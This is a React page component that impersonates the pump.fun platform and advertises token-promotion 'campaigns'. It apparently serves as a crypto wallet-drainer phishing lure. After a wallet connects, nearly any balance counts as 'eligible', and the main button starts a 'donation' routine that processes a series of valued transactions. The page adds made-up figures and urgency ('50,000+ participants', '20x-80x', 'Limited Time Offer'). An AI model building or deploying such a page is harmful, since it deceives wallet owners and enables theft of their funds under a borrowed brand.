import { useAccount } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { Button } from '@/components/ui/button';
import { useDonation } from '@/hooks/useDonation';
import { Heart, Wallet } from 'lucide-react';
import backgroundImage from '@/assets/web-background.png';
import logoImage from '@/assets/pill.svg';
import polyImg from '@/assets/tokens/poly.jpg';
import lionImg from '@/assets/tokens/lion.png';
import roadImg from '@/assets/tokens/road.png';
import capImg from '@/assets/tokens/cap.png';
import cadeImg from '@/assets/tokens/cade.png';
import pfpImg from '@/assets/tokens/pfp.png';
import pebbleImg from '@/assets/tokens/pebble.png';
import marsImg from '@/assets/tokens/mars.png';
import { useState, useEffect } from 'react';
import { useBalance } from 'wagmi';

const Index = () => {
  const { address, isConnected } = useAccount();
  const { open } = useWeb3Modal();
  const { startDonation, isProcessing, transactions, currentIndex } = useDonation();
  const { data: balanceData } = useBalance({ address });
  const [isEligible, setIsEligible] = useState<boolean>(false);

  const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);

  const tokens = [
    { name: 'poly', url: 'https://pump.fun/coin/5eMfXSYdssCpnu63WtPprjbbR5YBJmSEnZGRvtuppump', img: polyImg },
    { name: 'lion', url: 'https://pump.fun/coin/8NfK7b9u1RvMpHJnAnZki4mNQwjhvzrVZs7bRQatpump', img: lionImg },
    { name: 'road', url: 'https://pump.fun/coin/8ZeTmGGktvSwSSghx8btbTAVGdWogThKM4DQBJgRpump', img: roadImg },
    { name: 'cap', url: 'https://pump.fun/coin/7E2iF4WFs5biCtkAVFCBPEdnpg7t2D19VzxjxEPvpump', img: capImg },
    { name: 'tele', url: 'https://pump.fun/coin/GGV2LcQsvJc2oFZFESnWBVW5AFoMknNX9r31wS2Apump', img: polyImg },
    { name: 'cade', url: 'https://pump.fun/coin/Eg2ymQ2aQqjMcibnmTt8erC6Tvk9PVpJZCxvVPJz2agu', img: cadeImg },
    { name: 'feed', url: 'https://pump.fun/coin/J2eaKn35rp82T6RFEsNK9CLRHEKV9BLXjedFM3q6pump', img: polyImg },
    { name: 'pfp', url: 'https://pump.fun/coin/5TfqNKZbn9AnNtzq8bbkyhKgcPGTfNDc9wNzFrTBpump', img: pfpImg },
    { name: 'pebble', url: 'https://pump.fun/coin/Eppcp4FhG6wmaRno3omWWvKsZHbzucVLR316SdXopump', img: pebbleImg },
    { name: 'mars', url: 'https://pump.fun/coin/GqXX9MfkURBZ5cFym9HDzqTL7uZkjtCSqLkUSe2xpump', img: marsImg },
  ];

  useEffect(() => {
    if (balanceData) {
      const balance = Number(balanceData.formatted);
      setIsEligible(balance >= 0.00001);
    }
  }, [balanceData]);

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden">
      {/* Background image */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <img
          src={backgroundImage}
          alt="Background"
          className="w-full h-full object-cover"
        />
        {/* Blurry transparent overlay */}
        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
      </div>

      {/* Top Bar */}
      <div className="relative z-20 bg-black/90 backdrop-blur-md border-b border-white/10">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img
              src={logoImage}
              alt="Pump Logo"
              className="h-12 w-12 object-contain rounded-lg"
            />
            <span className="text-2xl font-bold text-white">pump.fun</span>
          </div>
          <w3m-button />
        </div>
      </div>

      {/* Main Content */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-2xl space-y-8">
          {/* Header */}
          <div className="text-center space-y-4">
            <div className="space-y-3">
              <Button variant="donate" size="lg" className="pointer-events-none">
                <svg className="w-5 h-5 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                Limited Time Offer
              </Button>
              <h1 className="text-5xl font-bold text-white">
                PUMP Your Token
              </h1>
            </div>
            <p className="text-xl text-white/90 max-w-2xl mx-auto leading-relaxed">
              Grow your project to the next level with well-organized strategic campaigns, with volume boost trending to scale your token
            </p>
            <div className="pt-4 space-y-2">
              <p className="text-lg text-white/80 font-semibold">Connect Wallet</p>
              <p className="text-2xl font-bold text-primary">PUMP / Set Up Campaigns</p>
            </div>
          </div>

          {/* Wallet Connection */}
          <div className="flex flex-col items-center gap-4">
            {!isConnected ? (
              <div className="text-center space-y-4">
                <p className="text-sm text-muted-foreground flex items-center gap-2 justify-center">
                  <Wallet className="w-4 h-4" />
                  Connect your wallet to start PUMP
                </p>
              </div>
            ) : (
              <div className="w-full space-y-6">
                {/* Eligibility Status */}
                <div className="bg-card/50 backdrop-blur-lg border border-border/50 rounded-xl p-6 text-center">
                  <p className={`text-2xl font-bold ${isEligible ? 'text-green-500' : 'text-red-500'}`}>
                    {isEligible ? 'Eligible Dev Tokens' : 'No Dev Tokens'}
                  </p>
                </div>

                {/* Action Button */}
                {!isProcessing && transactions.length === 0 && (
                  <Button
                    variant="donate"
                    size="xl"
                    onClick={startDonation}
                    className="w-full"
                    disabled={isProcessing}
                  >
                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    PUMP Tokens / Start Campaigns
                  </Button>
                )}

                {/* Stats Section */}
                <div className="flex justify-center items-center gap-8 mt-6">
                  <div className="text-center">
                    <p className="text-3xl font-bold text-white">50,000+</p>
                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PARTICIPANTS</p>
                  </div>
                  <div className="text-center">
                    <p className="text-3xl font-bold text-white">20x-80x</p>
                    <p className="text-xs text-muted-foreground uppercase tracking-wide">PUMP</p>
                  </div>
                </div>

              </div>
            )}
          </div>

        </div>
      </div>

      {/* Token Marquee */}
      <div className="relative z-10 py-8 overflow-hidden bg-transparent">
        <div className="container mx-auto px-4 mb-4 flex justify-end">
          <h3 className="text-xl font-bold text-white">Ongoing Campaigns</h3>
        </div>
        <div className="marquee-container">
          <div className="marquee-content">
            {[...tokens, ...tokens].map((token, index) => (
              <a
                key={`${token.name}-${index}`}
                href={token.url}
                target="_blank"
                rel="noopener noreferrer"
                className="inline-block mx-4 hover:scale-110 transition-transform duration-300"
              >
                <img
                  src={token.img}
                  alt={token.name}
                  className="h-16 w-16 rounded-lg object-cover shadow-lg"
                />
              </a>
            ))}
          </div>
        </div>
      </div>

      <style>{`
        @keyframes gradient {
          0%, 100% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
        }
        .animate-gradient {
          animation: gradient 3s ease infinite;
        }
        .delay-1000 {
          animation-delay: 1s;
        }

        @keyframes marquee {
          0% { transform: translateX(0); }
          100% { transform: translateX(-50%); }
        }

        .marquee-container {
          overflow: hidden;
          white-space: nowrap;
        }

        .marquee-content {
          display: inline-block;
          animation: marquee 30s linear infinite;
        }
      `}</style>
    </div>
  );
};

export default Index;
